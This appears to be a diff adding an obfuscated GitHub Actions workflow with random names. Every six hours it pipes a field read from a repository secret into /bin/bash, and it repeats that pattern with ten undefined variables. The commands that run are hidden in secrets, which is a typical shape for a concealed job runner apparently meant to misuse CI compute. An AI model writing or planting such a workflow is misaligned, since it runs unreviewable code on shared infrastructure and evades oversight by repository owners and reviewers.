@@ -1,0 +1,28 @@
+name: yetuna7816
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yetuna7816
+        env:
+          qnpl3731: ${{ secrets.qnpl3731 }}
+        run: |
+          echo $qnpl3731 | jq -r .dkse7863 | /bin/bash
+          echo $mqyfd5151 | jq -r .osx589 | /bin/bash
+          echo $jvnl9 | jq -r .y96442 | /bin/bash
+          echo $bn41 | jq -r .dnys992 | /bin/bash
+          echo $tjjfc0277 | jq -r .jtryn23 | /bin/bash
+          echo $lhqkt5 | jq -r .trz783 | /bin/bash
+          echo $asac7399 | jq -r .lpm1143 | /bin/bash
+          echo $fhda6939 | jq -r .vigd034 | /bin/bash
+          echo $az7 | jq -r .cwocq8 | /bin/bash
+          echo $ju32943 | jq -r .tuf635 | /bin/bash
+          echo $aihfc3 | jq -r .wd782 | /bin/bash
+
